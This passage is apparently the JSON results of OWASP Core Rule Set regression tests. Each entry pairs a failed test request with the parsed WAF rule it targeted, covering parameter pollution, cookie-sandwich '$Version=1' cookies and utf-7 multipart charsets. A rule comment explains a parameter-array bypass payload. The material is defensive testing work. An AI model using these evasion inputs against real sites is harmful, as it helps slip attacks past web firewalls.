          "uri" : "/?pineapple=pizza&pineapple=aint-pizza",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921180 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921180,
      "phase" : 2,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "/paramcounter_.*/"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "gt",
        "value" : "1"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921180
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Parameter Pollution (%{MATCHED_VAR_NAME})"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/15/460"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921180",
    "test_id" : 6,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921180.yaml",
    "description" : "query parameter repetition",
    "cause" : "failed expect_id check: 921180 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "query parameter repetition",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "method" : "GET",
          "port" : 80,
          "headers" : {
            "User-Agent" : "OWASP CRS test agent",
            "Host" : "localhost",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "uri" : "/?pineapple=pizza&pineapple=aint-pizza&pineapple=is-pizza&pineapple=aint-pizza2",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921180 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921180,
      "phase" : 2,
      "chain" : false,
      "comment_block" : null,
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "TX",
          "key" : "/paramcounter_.*/"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "gt",
        "value" : "1"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921180
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Parameter Pollution (%{MATCHED_VAR_NAME})"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/15/460"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921210",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921210.yaml",
    "description" : "HTTP Parameter Pollution via bogus chars after parameter array name",
    "cause" : "failed expect_id check: 921210 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "HTTP Parameter Pollution via bogus chars after parameter array name",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "port" : 80,
          "uri" : "/?foo[1]a=bar&foo[1]b=<evil>",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ HTTP Parameter Pollution ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Rule Logic ]"
        }, {
          "type" : "Comment",
          "text" : " Parameter pollution rule 921180 PL3 can by bypassed when a weak backend parameter"
        }, {
          "type" : "Comment",
          "text" : " parser is ignoring additional characters in a parameter array name after the"
        }, {
          "type" : "Comment",
          "text" : " closing of the array."
        }, {
          "type" : "Comment",
          "text" : " Rule 921210 PL3 prevents this by disallowing arbitrary strings after an array has"
        }, {
          "type" : "Comment",
          "text" : " been closed or inbetween the square brackets in multidimensional arrays."
        }, {
          "type" : "Comment",
          "text" : " Please note that rule 921210 allows for 2-dimensional, but not for higher dimensional"
        }, {
          "type" : "Comment",
          "text" : " arrays. If these are flagged as attacks, a rule exclusion will have to be"
        }, {
          "type" : "Comment",
          "text" : " deployed; ideally for the parameter(s) in question."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ References ]"
        }, {
          "type" : "Comment",
          "text" : " Private bug bounty in Spring 2022, findings Z05OZUCH."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [ Payloads ]"
        }, {
          "type" : "Comment",
          "text" : " * foo[1]a=bar&foo[1]b=<evil> - parameter parsers often cut after the closing of"
        }, {
          "type" : "Comment",
          "text" : "   the array. 921180 PL3 takes the full name, though."
        }, {
          "type" : "Comment",
          "text" : "   This impediance mismatch allows for bypasses."
        }, {
          "type" : "Comment",
          "text" : " * foo[1]x[1]=bar&foo[1]x[2]=<evil> - extension of 1; this has the advantage that"
        }, {
          "type" : "Comment",
          "text" : "   the parameter name does end with \"]\" just like a valid array notation."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(][^\\]]+$|][^\\]]+\\[)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "HTTP Parameter Pollution after detecting bogus char after parameter array"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/15/460"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.http_violation_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921250",
    "test_id" : 1,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921250.yaml",
    "description" : "Positive test: Detect if the cookie V1 is present in the request headers",
    "cause" : "failed expect_id check: 921250 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: Detect if the cookie V1 is present in the request headers",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "*/*",
            "Origin" : "https://www.example.com",
            "Referer" : "https://www.example.com/",
            "Cookie" : "$Version=1; session=\\\"deadbeef; PHPSESSID=secret; dummy=qaz\\\""
          },
          "port" : 80,
          "uri" : "/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921250 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921250,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detection for old V1 cookie format from RFC 2109."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This has been abused by the cookie sandwich technique, in diverse issues affecting Apache Tomcat, Python, and maybe others."
        }, {
          "type" : "Comment",
          "text" : " RFC 6265 deprecated and replaced RFCs 2109 and 2965."
        }, {
          "type" : "Comment",
          "text" : " It completely removed \"$Version\", meaning user agents and servers no longer use this attribute."
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " - https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique"
        }, {
          "type" : "Comment",
          "text" : " - https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual-%28v2.x%29#seccookieformat"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/\\x22?\\x24Version/"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "streq",
        "value" : "1"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921250
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Old Cookies V1 usage attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/33"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "921250",
    "test_id" : 2,
    "test_path" : "REQUEST-921-PROTOCOL-ATTACK/921250.yaml",
    "description" : "Positive test: Detect if cookie V1 and also quoting is trying to be abused in the request headers",
    "cause" : "failed expect_id check: 921250 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 2,
      "desc" : "Positive test: Detect if cookie V1 and also quoting is trying to be abused in the request headers",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "*/*",
            "Origin" : "https://www.example.com",
            "Referer" : "https://www.example.com/",
            "Cookie" : "$Version=1; session=\"deadbeef; PHPSESSID=secret; dummy=qaz\""
          },
          "port" : 80,
          "uri" : "/",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 921250 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 921250,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detection for old V1 cookie format from RFC 2109."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This has been abused by the cookie sandwich technique, in diverse issues affecting Apache Tomcat, Python, and maybe others."
        }, {
          "type" : "Comment",
          "text" : " RFC 6265 deprecated and replaced RFCs 2109 and 2965."
        }, {
          "type" : "Comment",
          "text" : " It completely removed \"$Version\", meaning user agents and servers no longer use this attribute."
        }, {
          "type" : "Comment",
          "text" : " See:"
        }, {
          "type" : "Comment",
          "text" : " - https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique"
        }, {
          "type" : "Comment",
          "text" : " - https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual-%28v2.x%29#seccookieformat"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : "/\\x22?\\x24Version/"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "streq",
        "value" : "1"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 921250
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Old Cookies V1 usage attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/PROTOCOL-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/210/272/220/33"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "922100",
    "test_id" : 1,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922100.yaml",
    "description" : "Positive test: utf-7 is not in allowed charsets",
    "cause" : "failed expect_id check: 922100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: utf-7 is not in allowed charsets",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-disposition: form-data; name=\"_charset_\"\n\nutf-7\n--boundary\nContent-disposition: form-data; name=\"positive\"\nContent-Type: text/plain\n\nLet me see if I can use utf-7.\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 922100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922100,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Only allow specific charsets when using \"_charset_\""
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : true,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : "_charset_"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "negated",
        "operator" : {
          "type" : "Operator",
          "operator_type" : "eq",
          "value" : "0"
        }
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart content type global _charset_ definition is not allowed by policy"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{ARGS._charset_}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.922100_charset=|%{ARGS._charset_}|"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "922100",
    "test_id" : 3,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922100.yaml",
    "description" : "Positive test: don't allow substrings of valid charsets when using _charset_",
    "cause" : "failed expect_id check: 922100 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Positive test: don't allow substrings of valid charsets when using _charset_",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-disposition: form-data; name=\"_charset_\"\n\nutf-\n--boundary\nContent-disposition: form-data; name=\"negative\"\nContent-Type: text/plain\n\nutf-8 is valid but utf- should not be.\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 922100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922100,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Only allow specific charsets when using \"_charset_\""
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : true,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : "_charset_"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "negated",
        "operator" : {
          "type" : "Operator",
          "operator_type" : "eq",
          "value" : "0"
        }
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Multipart content type global _charset_ definition is not allowed by policy"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{ARGS._charset_}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/255/153"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.922100_charset=|%{ARGS._charset_}|"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "922110",
    "test_id" : 1,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922110.yaml",
    "description" : "Positive test: utf-7 is not in allowed charsets",
    "cause" : "failed expect_id check: 922110 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Positive test: utf-7 is not in allowed charsets",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "multipart/form-data; boundary=boundary",
            "Accept" : "*/*"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "--boundary\nContent-disposition: form-data; name=\"_charset_\"\n\nutf-8\n--boundary\nContent-disposition: form-data; name=\"922110\"\nContent-Type: text/plain; charset=utf-7\n\nKnock knock.\n--boundary--\n"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 922110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 922110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Only allow specific charsets same as Rule 920600"
        }, {
          "type" : "Comment",
          "text" : " Note: this is in phase:2 because these are headers that come in the body"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/922110-chain1.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 922110-chain1"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "MULTIPART_PART_HEADERS",
          "key" : null
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "^content-type\\s*:\\s*(.*)$"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 922110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Illegal MIME Multipart Header content-type: charset parameter"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.1} found within Content-Type multipart form"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-multipart-header"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-protocol"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/MULTIPART-ATTACK"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/272/220"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "922120",
    "test_id" : 1,
    "test_path" : "REQUEST-922-MULTIPART-ATTACK/922120.yaml",
    "description" : "Positive test: utf-7 is not in allowed charsets",
    "cause" : "failed expect_id check: 922120 not found",
    "result" : {
      "disposition" : {
